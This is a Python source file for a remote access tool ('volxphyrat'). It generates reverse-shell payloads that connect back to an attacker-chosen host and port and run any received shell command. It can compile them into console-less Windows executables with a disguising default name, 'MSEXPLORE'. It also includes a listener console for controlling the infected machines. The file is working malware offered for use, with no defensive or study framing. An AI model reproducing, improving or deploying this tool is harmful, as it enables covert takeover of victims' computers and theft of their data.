import socket
import subprocess
import os
import sys
import time
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Banners
banners = [
    r"""
____   ____    .__                 .__           __________         __   
\   \ /   /___ |  | ___  _________ |  |__ ___.__.\______   \_____ _/  |_ 
 \   Y   /  _ \|  | \  \/  /\____ \|  |  <   |  | |       _/\__  \\   __\
  \     (  <_> )  |__>    < |  |_> >   Y  \___  | |    |   \ / __ \|  |  
   \___/ \____/|____/__/\_ \|   __/|___|  / ____| |____|_  /(____  /__|  
                          \/|__|        \/\/             \/      \/      
""",
    r"""
  ____            _ _            _                            _               _____           _ 
 |  _ \ ___  __ _| | |_   _     / \   _ __  _ __   ___  _   _(_)_ __   __ _  |_   _|__   ___ | |
 | |_) / _ \/ _` | | | | | |   / _ \ | '_ \| '_ \ / _ \| | | | | '_ \ / _` |   | |/ _ \ / _ \| |
 |  _ <  __/ (_| | | | |_| |  / ___ \| | | | | | | (_) | |_| | | | | | (_| |   | | (_) | (_) | |
 |_| \_\___|\__,_|_|_|\__, | /_/   \_\_| |_|_| |_|\___/ \__, |_|_| |_|\__, |   |_|\___/ \___/|_|
                      |___/                             |___/         |___/                      
""",
    r"""
  _______  ______  _     ___ ___ _____    ___     _     ___   ___ _____ 
 | ____\ \/ /  _ \| |   / _ \_ _|_   _|  ( _ )   | |   / _ \ / _ \_   _|
 |  _|  \  /| |_) | |  | | | | |  | |    / _ \/\ | |  | | | | | | || |  
 | |___ /  \|  __/| |__| |_| | |  | |   | (_>  < | |__| |_| | |_| || |  
 |_____/_/\_\_|   |_____\___/___| |_|    \___/\/ |_____\___/ \___/ |_|  
                                                                       
""",
]

# Default banner
current_banner = 0

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + banners[current_banner] + Style.RESET_ALL)

def create_reverse_shell(lhost, lport, output_format="EXE", console=True, name="MSEXPLORE"):
    print(Fore.GREEN + f"Creating reverse shell with LHOST={lhost}, LPORT={lport}, FORMAT={output_format}, CONSOLE={console}, NAME={name}" + Style.RESET_ALL)

    script_content = f"""
import socket
import subprocess
import time
import os

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("{lhost}", {lport}))

            while True:
                cmd = s.recv(1024).decode()
                if cmd.lower() == "exit":
                    break

                if cmd.startswith("start") or cmd.endswith(".bat"):
                    try:
                        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        output, error = process.communicate()
                        if output:
                            s.send(output)
                        if error:
                            s.send(error)
                    except Exception as e:
                        s.send(str(e).encode())
                else:
                    try:
                        output = subprocess.getoutput(cmd)
                        s.send(output.encode())
                    except Exception as e:
                        s.send(str(e).encode())

            s.close()
        except Exception as e:
            time.sleep(30)

if __name__ == "__main__":
    connect()
"""

    script_filename = f"{name}.py"
    with open(script_filename, "w") as file:
        file.write(script_content)

    if output_format.lower() == "exe":
        print(Fore.GREEN + f"Compiling {script_filename} to {name}.exe using PyInstaller..." + Style.RESET_ALL)
        console_flag = "--noconsole" if not console else ""
        os.system(f"pyinstaller --onefile {console_flag} {script_filename}")


        os.remove(f"{name}.spec")
        os.remove(script_filename)
    else:
        print(Fore.GREEN + f"Script saved as {script_filename}" + Style.RESET_ALL)

def start_listener(lhost, lport, payload=None):

    rat_path = os.path.abspath(os.path.dirname(sys.argv[0]))
    prompt = Fore.YELLOW + f"sudo@({lhost})" + Fore.RED + f"{rat_path}> " + Style.RESET_ALL
    print(Fore.GREEN + f"[+] Starting listener on {lhost}:{lport} with payload {payload}" + Style.RESET_ALL)
    
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((lhost, int(lport)))
    listener.listen(5)
    print(Fore.GREEN + f"[+] Listening on {lhost}:{lport}" + Style.RESET_ALL)

    while True:
        client_socket, client_address = listener.accept()
        print(Fore.GREEN + f"[+] Connection from {client_address}" + Style.RESET_ALL)
        
        try:
            while True:
                cmd = input(prompt)

                if cmd.lower() == "exit":
                    client_socket.send(cmd.encode())
                    client_socket.close()
                    break

                if cmd.strip():
                    client_socket.send(cmd.encode())
                    client_socket.settimeout(2)
                    response = b""
                    try:
                        while True:
                            part = client_socket.recv(4096)
                            response += part
                            if len(part) < 4096:
                                break
                    except socket.timeout:
                        pass
                    finally:
                        client_socket.settimeout(None)
                    if response:
                        print(response.decode())
                    else:
                        print(Fore.YELLOW + "[+] Command executed with no output." + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[-] Connection lost: {e}" + Style.RESET_ALL)
            client_socket.close()
            break

def show_help():
    help_text = f"""
{Fore.BLUE}vxvenomous{Style.RESET_ALL} - Command line utility for reverse shell creation and listener

{Fore.LIGHTBLACK_EX}USAGE:{Style.RESET_ALL}
{Fore.BLUE}vxvenomous{Style.RESET_ALL} {Fore.LIGHTBLACK_EX}-LHOST={Fore.GREEN}<IP>{Style.RESET_ALL} {Fore.LIGHTBLACK_EX}-LPORT={Fore.GREEN}<PORT>{Style.RESET_ALL}
{Fore.BLUE}vxvenomous{Style.RESET_ALL} {Fore.LIGHTBLACK_EX}-Output={Fore.GREEN}<FORMAT>{Style.RESET_ALL} {Fore.LIGHTBLACK_EX}...{Style.RESET_ALL}
{Fore.BLUE}vxvenomous{Style.RESET_ALL} {Fore.LIGHTBLACK_EX}-console={Fore.GREEN}<true/false>{Style.RESET_ALL} {Fore.LIGHTBLACK_EX}...{Style.RESET_ALL}
{Fore.BLUE}vxvenomous{Style.RESET_ALL} {Fore.LIGHTBLACK_EX}-Name={Fore.GREEN}<NAME>{Style.RESET_ALL}

{Fore.BLUE}banner{Style.RESET_ALL} - Change the banner displayed

{Fore.BLUE}show help{Style.RESET_ALL} - Show this help message

{Fore.BLUE}use exploit/listener{Style.RESET_ALL} - Start the exploit listener
{Fore.BLUE}Set LHOST {Fore.GREEN}<ip>{Style.RESET_ALL} - Set the listener host IP
{Fore.BLUE}Set LPORT {Fore.GREEN}<port>{Style.RESET_ALL} - Set the listener port
{Fore.BLUE}Set payload {Fore.GREEN}<payload>{Style.RESET_ALL} - Set the payload to use
{Fore.BLUE}run{Style.RESET_ALL} - Start the listener
{Fore.BLUE}exit{Style.RESET_ALL} - Exit the current command or the program
"""
    print(help_text)

def main():
    global current_banner
    print_banner()
    
    while True:
        try:
            cmd = input(Fore.CYAN + "volxphyrat> " + Style.RESET_ALL).strip()

            if cmd.lower() == "banner":
                current_banner = (current_banner + 1) % len(banners)
                print_banner()

            elif cmd.lower() == "show help":
                show_help()

            elif cmd.lower() == "cum":
                print("[+] You just came")

            elif cmd.startswith("vxvenomous"):
                parts = cmd.split()
                lhost, lport, output_format, console, name = None, None, "EXE", True, "MSEXPLORE"

                for part in parts:
                    if "=" in part:
                        key, value = part.split('=', 1)
                        if key in ["-LHOST", "-lhost"]:
                            lhost = value
                        elif key in ["-LPORT", "-lport"]:
                            lport = value
                        elif key in ["-Output", "-O"]:
                            output_format = "EXE" if "EXE" in value.upper() else "PY"
                        elif key in ["-console", "-c"]:
                            console = "true" in value.lower()
                        elif key in ["-Name", "-N"]:
                            name = value

                if lhost and lport:
                    create_reverse_shell(lhost, lport, output_format, console, name)
                else:
                    print(Fore.RED + "[-] LHOST and LPORT are required" + Style.RESET_ALL)

            elif cmd.startswith("use exploit/listener"):
                print("Type 'Set LHOST <ip>' to set the listener host.")
                print("Type 'Set LPORT <port>' to set the listener port.")
                lhost, lport, payload = None, None, None

                while True:
                    listener_cmd = input(Fore.YELLOW + "sudo@(exploit/listener)>> " + Style.RESET_ALL).strip()

                    if listener_cmd.lower().startswith("set lhost"):
                        lhost = listener_cmd.split()[-1]

                    elif listener_cmd.lower().startswith("set lport"):
                        lport = listener_cmd.split()[-1]

                    elif listener_cmd.lower().startswith("set payload"):
                        payload = listener_cmd.split()[-1]

                    elif listener_cmd.lower() == "run":
                        if lhost and lport:
                            start_listener(lhost, lport, payload)
                        else:
                            print(Fore.RED + "[-] LHOST and LPORT must be set before running the listener." + Style.RESET_ALL)
                        break

                    elif listener_cmd.lower() == "exit":
                        break

            elif cmd.lower() == "exit":
                break

            else:
                print(Fore.RED + "[-] Unknown command" + Style.RESET_ALL)

        except KeyboardInterrupt:
            print(Fore.RED + "\n[-] Exiting..." + Style.RESET_ALL)
            break

if __name__ == "__main__":
    main()
